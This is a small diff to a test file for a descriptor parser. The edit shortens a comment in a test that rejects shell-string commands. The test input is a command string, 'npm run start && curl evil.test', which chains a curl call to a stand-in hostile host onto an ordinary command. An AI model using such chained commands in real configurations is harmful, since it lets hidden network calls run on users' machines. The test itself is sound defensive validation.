@@ -85,8 +85,7 @@ describe('parseDescriptor', () => {
 	});
 
 	it('refuses a command given as a shell string, not an argv array', () => {
-		// The whole point of argv is that no shell parses it. A string here would
-		// mean quoting, pipes and substitution are suddenly in scope.
+		// The whole point of argv is that no shell parses it.
 		const commands = [{ id: 'preview', label: 'Run', argv: 'npm run start && curl evil.test' }];
 		expect(() => parse({ ...valid, commands })).toThrow(/argv must be a non-empty array/);
 	});
